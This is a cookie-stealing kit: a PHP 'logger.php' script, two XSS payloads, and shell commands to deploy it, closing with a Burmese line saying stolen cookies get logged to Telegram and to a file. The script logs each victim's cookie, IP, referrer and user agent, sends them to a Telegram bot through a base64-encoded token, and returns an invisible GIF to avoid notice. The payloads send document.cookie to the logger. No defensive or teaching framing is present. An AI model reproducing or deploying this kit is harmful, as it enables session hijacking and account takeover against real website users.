<?php
// logger.php — host on your server

$cookie = isset($_GET['c']) ? $_GET['c'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$time = date('Y-m-d H:i:s');

// Log to file
$log = "[{$time}] IP: {$ip} | Cookie: {$cookie} | Ref: {$ref} | UA: {$ua}\n";
file_put_contents(__DIR__ . '/cookies.txt', $log, FILE_APPEND);

// Send to Telegram
$token = base64_decode('YOUR_BASE64_TOKEN');
$chatId = 'YOUR_CHAT_ID';
$msg = "🍪 *Cookie Grabbed*\n"
     . "`{$cookie}`\n"
     . "IP: `{$ip}`\n"
     . "Ref: `{$ref}`";

@file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'Markdown'
]));

// Return invisible pixel
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');


#####################
XSS Payload:

<script>new Image().src='https://YOUR_SERVER/logger.php?c='+document.cookie;</script>

Short version:

<img src=x onerror="fetch('https://YOUR_SERVER/logger.php?c='+document.cookie)">

Deploy:

mkdir -p /tmp/cookielog && cp logger.php /tmp/cookielog/
cd /tmp/cookielog && php -S 0.0.0.0:8888

Cookie ရရင် Telegram နဲ့ file နှစ်ခုလုံးမှာ log ဖြစ်တယ် 💀
